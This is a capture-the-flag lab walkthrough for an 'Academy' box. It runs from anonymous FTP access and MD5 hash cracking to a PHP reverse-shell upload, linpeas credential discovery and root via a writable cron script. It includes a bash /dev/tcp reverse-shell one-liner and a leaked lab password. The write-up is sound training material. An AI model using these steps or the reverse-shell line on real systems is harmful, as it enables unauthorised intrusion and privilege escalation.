
After the scan we found 3 open ports
Note: For more details look into "Rust and Nmap Scans"

- Port 21 vsftpd 3.0.3
- Port 22 OpenSSH 7.9p1
- Port 80 Apache httpd 2.4.38 ((Debian))

**Anonymous FTP  allowed.**

- In this ftp login we found a note
  
```
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta

``` 

So, we got student registration number and password hash

Cracking hash I got: cd73502828457d15655bbd7a63fb0bc8:student (I've used hashes.com) 
for the cracking we can used the commandline
Find the hash: hash-identifier cd73502828457d15655bbd7a63fb0bc8  
(The hash is md5). Save this hash into a file 
Now use hashcrack: hashcrack -m 0 hash.txt path/to/wordlist
- hashcrack -m <mode for hash> <hash file that need to be cracked> <wordlist>

Now, to know the exact location of the login page for students. I performed a gobuster directory scan. For more details look into the gobuster.txt.

Other tools:
	- dirb http://<ip address>
	- ffuf -w /usr/share/wordlst/dirbuster/directory-list-2.3-medium.txt:FUZZ http://<ip address>/FUZZ

```
Successfully logged inn
```
Now, after successful login I've observed there's a my-profile page where we can upload an image. (But instead of image I uploaded an php reverse shell).
Note: before uploading the php reverse shell open an netcat listener.

Now, after the successful reverse shell. I thought of privilege escalation but we have limited access.

So, I executed "linpeas.sh"

I downloaded linpeas and opened an python3 http.server
- Command: wget http://<attacker Ip>:<port>/linpeas.sh

After, executing linpeas.sh I gound an user name "grimmie" and his password "My_V3ryS3cur3_P4ss".

Performed ssh : ssh grimmie@<target ip> 

Found a box backup.sh
Info: while performing linpeas.sh I didn't find any cronjobs in the machine.

So, in order to check any automated files running on the system I downloaded pspy64 tool. This tools helps to monitor all the processes which are running on the system without root access.

So, downloaded pspy from "https://github.com/DominicBreuker/pspy?tab=readme-ov-file"

I found backup.sh was running for every minute with root privilege.

So, I changed the content of backup.sh and added the one linear bash script for reverse chell.

""' `bash -c 'exec bash -i &>/dev/tcp/192.168.1.12/9999 <&1' '""


Finally got the root access and captured the flag.

%% congratz you rooted this box !
    Loks like this CMS isn't so secure...
    I hope you enjoyed it.
    If you have any issue please let us know in the course discord.
    Happy hacking !
%%









